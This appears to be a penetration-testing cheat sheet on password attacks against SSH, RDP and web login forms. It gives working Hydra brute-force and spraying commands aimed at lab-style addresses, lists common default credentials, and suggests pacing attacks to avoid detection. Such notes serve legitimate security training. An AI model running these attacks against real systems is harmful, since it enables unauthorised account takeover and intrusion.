# Network Service Password Attacks

Techniques for brute forcing and password spraying against network services including SSH, RDP, and HTTP login forms using Hydra and related tools.

---

## SSH Attacks

### Dictionary Attack
```bash
# Hydra SSH attack on custom port
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target_ip>

# Example
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

### Password Spraying
```bash
# Single password against multiple users
hydra -L <userlist> -p "<password>" ssh://<target_ip>

# Example with custom userlist
echo -e "admin\nroot\nuser" > users.txt
hydra -L users.txt -p "password123" ssh://192.168.50.201
```

---

## RDP Attacks

### Dictionary Attack
```bash
# Basic RDP attack
hydra -l <username> -P <wordlist> rdp://<target_ip>

# Password spraying on RDP
hydra -L <userlist> -p "<password>" rdp://<target_ip>
```

---

## HTTP POST Login Forms

### Capture Request Data
```bash
# Use an intercepting proxy to capture the login request
# Identify POST data format: fm_usr=user&fm_pwd=^PASS^
# Identify failure message: "Login failed. Invalid"
```

### HTTP POST Attack
```bash
# Hydra HTTP POST form attack
hydra -l <username> -P <wordlist> <target_ip> http-post-form "<path>:<post_data>:<failure_string>"

# Example
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

---

## Wordlist Preparation

### Uncompress Rockyou
```bash
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz
```

### Custom Wordlists
```bash
# Create targeted wordlist
echo -e "password\nadmin\nuser\ntest" > custom.txt

# Combine wordlists
cat wordlist1.txt wordlist2.txt > combined.txt
```

---

## Attack Considerations

### Important Notes
- Dictionary attacks generate significant logs and traffic
- May trigger account lockouts after failed attempts
- WAF/fail2ban can block brute force attempts
- Always check for rate limiting and defensive measures

### Best Practices
- Start with common/default credentials
- Use targeted wordlists when possible
- Monitor for account lockout policies
- Consider time-based attacks to avoid detection

---

## Common Default Credentials

### SSH
- root:root, root:toor, root:password
- admin:admin, admin:password
- user:user, user:password

### RDP
- Administrator:password, Administrator:admin
- admin:admin, admin:password123

### Web Applications
- admin:admin, admin:password
- user:user, user:password
- guest:guest

---

## Quick Reference

```bash
# SSH Dictionary Attack
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<ip>

# RDP Password Spray
hydra -L <userlist> -p "<password>" rdp://<ip>

# HTTP POST Form Attack
hydra -l <user> -P <wordlist> <ip> http-post-form "<path>:<data>:<failure>"
```
